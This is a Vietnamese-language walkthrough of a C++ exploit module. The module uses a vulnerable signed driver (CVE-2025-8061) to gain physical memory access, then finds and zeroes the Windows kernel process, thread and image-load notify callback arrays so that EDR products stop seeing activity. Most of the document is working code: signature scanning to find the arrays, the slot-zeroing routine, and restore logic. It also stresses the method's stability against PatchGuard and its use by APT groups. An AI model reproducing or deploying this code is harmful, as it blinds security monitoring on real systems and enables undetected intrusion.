# 09 — Kernel Callback Removal (Ps* Notify Arrays)

**File:** `09_callback_kill.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive dùng:** Physical read/write + Kernel VA read + Export scan  
**Output:** EDR không còn nhận notification về process creation, thread creation, image load

---

## Mục tiêu

Zero các entry trong ba array của Windows kernel chứa EDR/AV callbacks:
- `PspCreateProcessNotifyRoutineArray` — triggered khi process tạo/exit
- `PspCreateThreadNotifyRoutineArray` — triggered khi thread tạo/exit
- `PspLoadImageNotifyRoutineArray` — triggered khi PE image load vào memory

---

## Lý thuyết nền

### Kernel Notification Callbacks

EDR products gọi `PsSetCreateProcessNotifyRoutine[Ex]`, `PsSetCreateThreadNotifyRoutine`, `PsSetLoadImageNotifyRoutine` để đăng ký callback. Mỗi lần kernel tạo process/thread hoặc load image, nó iterate qua array tương ứng và gọi từng callback.

### EX_FAST_REF format

Mỗi slot trong array là `EX_CALLBACK_ROUTINE_BLOCK*` được lưu dưới dạng **ExFastRef**:

```
bits [63:4] = pointer đến EX_CALLBACK_ROUTINE_BLOCK (16-byte aligned)
bits [3:0]  = reference count (kernel tự quản lý)
```

Khi zero toàn bộ 8 bytes → kernel thấy slot = null → skip → callback không được gọi.

### Tìm array address

Các array này KHÔNG được export trực tiếp. Ta tìm chúng bằng cách:
1. `PsSetCreateProcessNotifyRoutine` được export từ ntoskrnl
2. Code của nó gọi một internal function
3. Internal function đó có `LEA r, [RIP+imm32]` trỏ vào array trong `.data`

Pattern: scan code của exported function và callee, tìm LEA instruction trỏ vào `.data` với offset đặc trưng.

### PatchGuard không check arrays này

**Confirmed** trên Win10 19041 → Win11 26100. Microsoft quyết định không protect các arrays này vì chúng là legitimate data structures. Đây là lý do technique này **stable** hơn ETW patch.

---

## Giải thích code từng dòng

### GetNtoskrnlInfo() — lấy base, .data bounds

```cpp
struct NtInfo {
    uint64_t base;
    uint64_t data_va;
    uint32_t data_size;
};

static bool GetNtoskrnlInfo(uint64_t cr3, NtInfo *out)
{
    // NtQuerySystemInformation(11) để lấy kernel module list
    // Tìm "ntoskrnl.exe" hoặc "ntkrnlmp.exe"
    ...
    out->base = (uint64_t)(uintptr_t)mods[i].ib;

    // Parse PE header để tìm .data section bounds
    uint8_t hdrbuf[0x1000] = {};
    KernelRead(cr3, out->base, hdrbuf, sizeof(hdrbuf));

    for (WORD s = 0; s < nsec && s < 32; s++) {
        DWORD o = soff + s * 40;  // IMAGE_SECTION_HEADER offset
        const char *name  = (const char*)(hdrbuf + o);
        DWORD vsize = *(DWORD*)(hdrbuf + o + 0x08);  // VirtualSize
        DWORD vrva  = *(DWORD*)(hdrbuf + o + 0x0C);  // VirtualAddress
        DWORD chars = *(DWORD*)(hdrbuf + o + 0x24);  // Characteristics

        // .data: writable (0x40000000) + readable (0x80000000)
        if (strncmp(name, ".data", 5) == 0 && (chars & 0xC0000000) == 0xC0000000) {
            out->data_va   = out->base + vrva;
            out->data_size = vsize;
        }
    }
}
```

Ta cần `.data` bounds để validate LEA targets: array phải nằm trong `.data` của ntoskrnl.

### FindCallbackArray() — core algorithm

```cpp
static uint64_t FindCallbackArray(uint64_t cr3, uint64_t func_va,
                                   uint64_t data_va, uint32_t data_size,
                                   const char *label)
{
    // Có thể scan exported function VÀ các sub-functions nó call
    uint64_t scan_targets[4] = { func_va, 0, 0, 0 };
    int      n_targets = 1;

    for (int t = 0; t < n_targets; t++) {
        uint64_t scan_va = scan_targets[t];
        uint8_t code[512] = {};
        KernelRead(cr3, scan_va, code, sizeof(code));
```

```cpp
        for (int i = 0; i < (int)sizeof(code) - 7; i++) {
            uint8_t pfx = code[i];
            uint8_t op  = code[i+1];

            // Follow CALL (E8 imm32) để scan callee — vì PsSetCreateProcessNotifyRoutine
            // có thể chỉ là wrapper gọi internal function thực sự access array
            if (code[i] == 0xE8 && n_targets < 4) {
                int32_t rel = *(int32_t*)(code + i + 1);
                uint64_t callee = scan_va + i + 5 + (int64_t)rel;
                // CALL target = next instruction (i+5) + signed relative offset
                
                if ((callee >> 48) == 0xFFFF) {  // phải là kernel VA
                    bool dup = false;
                    for (int k = 0; k < n_targets; k++)
                        if (scan_targets[k] == callee) { dup = true; break; }
                    if (!dup) scan_targets[n_targets++] = callee;
                    // Thêm callee vào scan queue (tối đa 4)
                }
            }
```

```cpp
            // Pattern: LEA với REX prefix
            // REX prefix: 0x40-0x4F (bits: 0100 W R X B)
            // W=1 → 64-bit operand; các bit khác → extend registers
            if ((pfx & 0xF0) != 0x40) continue;  // phải là REX byte
            if (op != 0x8D) continue;             // 0x8D = LEA opcode

            uint8_t modrm = code[i+2];
            // mod=00, rm=101 → RIP-relative addressing
            // 0xC7 = 11000111b (mask bits[7:6] và [2:0])
            // 0x05 = 00000101b (mod=00, rm=101)
            if ((modrm & 0xC7) != 0x05) continue;
```

LEA instruction encoding (REX.W 8D /r imm32):
```
byte 0: REX prefix (0x48/0x49/0x4C/0x4D)
byte 1: 0x8D (LEA)
byte 2: ModRM = mod:reg:rm
byte 3-6: imm32 (signed RIP-relative offset)
```

```cpp
            int32_t  imm32  = *(int32_t*)(code + i + 3);
            uint64_t target = scan_va + i + 7 + (int64_t)imm32;
            // RIP = scan_va + i + 7 (next instruction: 1+1+1+4 = 7 bytes)
            // target = RIP + sign_extend(imm32)
```

```cpp
            // Target phải nằm trong .data của ntoskrnl
            if (target < data_va || target + 8 > data_va + data_size) continue;

            // Đọc 8 entries đầu tiên của candidate array
            uint64_t entries[8] = {};
            KernelRead(cr3, target, entries, sizeof(entries));

            bool has_kernel_entry = false;
            bool all_valid = true;
            for (int k = 0; k < 8; k++) {
                uint64_t e = entries[k];
                if (e == 0) continue;  // empty slot — OK
                uint64_t ptr = e & ~0xFULL;  // clear ExFastRef refcount bits
                if ((ptr >> 48) == 0xFFFF) {
                    has_kernel_entry = true;
                    continue;
                }
                all_valid = false; break;  // không phải kernel pointer → false positive
            }
            if (!all_valid) continue;
            if (!has_kernel_entry) continue;  // tất cả zero → array rỗng, không useful

            return target;  // found!
```

Validation logic:
1. Target phải trong `.data` — tránh scan vào code section
2. Đọc 8 slots đầu — mỗi slot phải là null hoặc kernel ExFastRef pointer
3. Phải có ít nhất 1 non-null entry (có EDR đăng ký)
4. Nếu có giá trị không hợp lệ → đây là data ngẫu nhiên, skip

### ZeroCallbacks()

```cpp
static int ZeroCallbacks(uint64_t cr3, uint64_t array_va,
                          const char *label, CbSaved *save)
{
    for (int i = 0; i < MAX_CALLBACKS; i++) {  // MAX_CALLBACKS = 64
        uint64_t entry_va = array_va + (uint64_t)i * 8;  // mỗi entry 8 bytes
        uint64_t entry_pa = VaToPa(cr3, entry_va);
        if (!entry_pa) continue;

        uint64_t val = 0;
        PhysReadU64(entry_pa, &val);
        save->orig[i] = val;

        if (!val) continue;  // slot trống, skip

        uint64_t ptr = val & ~0xFULL;  // ExFastRef: clear low 4 bits
        printf("  [%02d] 0x%016llX  ptr=0x%016llX\n", i, val, ptr);

        // Zero slot
        PhysWriteU64(entry_pa, 0);

        // Readback verify
        uint64_t rb = 0xFFFF;
        PhysReadU64(entry_pa, &rb);
        if (rb == 0) {
            zeroed++;
            save->count++;
        } else {
            printf("    [!] Slot %d write did not stick (HVCI?)\n", i);
        }
    }
```

### RestoreCallbacks()

```cpp
static void RestoreCallbacks(uint64_t cr3, const CbSaved *save, const char *label)
{
    for (int i = 0; i < MAX_CALLBACKS; i++) {
        if (!save->orig[i]) continue;  // slot gốc là null → không cần restore

        uint64_t entry_va = save->array_va + (uint64_t)i * 8;
        uint64_t entry_pa = VaToPa(cr3, entry_va);
        if (!entry_pa) continue;

        PhysWriteU64(entry_pa, save->orig[i]);  // restore giá trị gốc
    }
}
```

### Main targets

```cpp
static const struct { const char *export_sym; const char *label; } targets[] = {
    { "PsSetCreateProcessNotifyRoutine", "PspCreateProcessNotifyRoutineArray" },
    { "PsSetCreateThreadNotifyRoutine",  "PspCreateThreadNotifyRoutineArray"  },
    { "PsSetLoadImageNotifyRoutine",     "PspLoadImageNotifyRoutineArray"     },
};
```

Ba exported functions này là "entry points" để ta locate ba arrays tương ứng.

---

## Tại sao technique này được APT dùng nhiều

1. **Stable** — PG không check, không BSOD
2. **Effective** — xóa notification → EDR không biết có process mới → bypass DLL injection detection, memory scanning on new process
3. **Reversible** — restore arrays → clean up bằng zero
4. **Data-only** — không modify code, không trigger code integrity checks

**Lazarus FudModule** (2022, 2024), **RealBlindingEDR** (Chinese), **EDRSandBlast** (Wavestone) đều implement technique này.

---

## Stability

| Vấn đề | Giải thích |
|--------|-----------|
| PatchGuard | **Không check** — data-only, ổn định |
| HVCI | Không ảnh hưởng — data section không protected bởi hypervisor |
| EDR re-registration | Một số EDR re-register callback khi detect callback bị remove. Nhưng chỉ khi có event để trigger re-registration |
| KASLR | Resolve array VA fresh mỗi lần run |

---

## Tóm tắt flow

```
GetSystemCR3() → cr3
GetNtoskrnlInfo(cr3) → nt.base, .data bounds

For each Ps* exported function:
    GetNtExport(fn_name) → fn_va
    FindCallbackArray(cr3, fn_va, .data bounds):
        Scan 512 bytes của fn code + callees
        Tìm LEA [RIP+X] với target trong .data
        Validate: entries là kernel ExFastRef pointers
        → array_va

For each found array:
    For slot 0..63:
        PhysReadU64(slot_pa) → original value
        PhysWriteU64(slot_pa, 0)
        Verify write stuck

[+] N callbacks zeroed — EDR blind

[Press Enter]

Restore all original values
```
